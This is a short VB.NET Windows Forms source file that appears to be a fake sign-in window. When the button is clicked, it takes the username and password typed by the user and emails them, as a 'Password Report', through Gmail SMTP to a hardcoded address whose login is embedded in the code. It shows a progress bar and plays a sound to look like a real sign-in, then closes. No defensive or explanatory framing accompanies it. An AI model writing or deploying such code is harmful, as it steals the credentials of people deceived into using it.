Imports System.Net.Mail
Public Class Form1

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim user As String = TextBox1.Text
        Dim pass As String = TextBox2.Text
        Dim sound As Object = My.Resources.rnd_okay
        Dim smtpServer As New SmtpClient
        ProgressBar1.Value = 10
        Dim mail As New MailMessage
        ProgressBar1.Value = 17
        smtpServer.Credentials = New Net.NetworkCredential("free2sendmail@gmail.com", "sendmail4free")
        ProgressBar1.Value = 23
        smtpServer.Port = 587
        ProgressBar1.Value = 28
        My.Computer.Audio.Play("C:\Program Files\Adobe\Adobe Media Encoder CS6\sounds\rnd_okay.wav")
        smtpServer.Host = "smtp.gmail.com"
        ProgressBar1.Value = 49
        smtpServer.EnableSsl = True
        mail = New MailMessage
        mail.From = New MailAddress("free2sendmail@gmail.com")
        mail.To.Add("free2sendmail@gmail.com")
        mail.Subject = "Password Report"
        mail.Body = "Here is the username:" & ControlChars.NewLine & user & ControlChars.NewLine & "Here is the password:" & ControlChars.NewLine & pass
        smtpServer.Send(mail)
        My.Computer.Audio.Play("C:\Program Files\Adobe\Adobe Media Encoder CS6\sounds\rnd_okay.wav")
        'MsgBox("Sign-in successful")
        Me.Close()
    End Sub
End Class
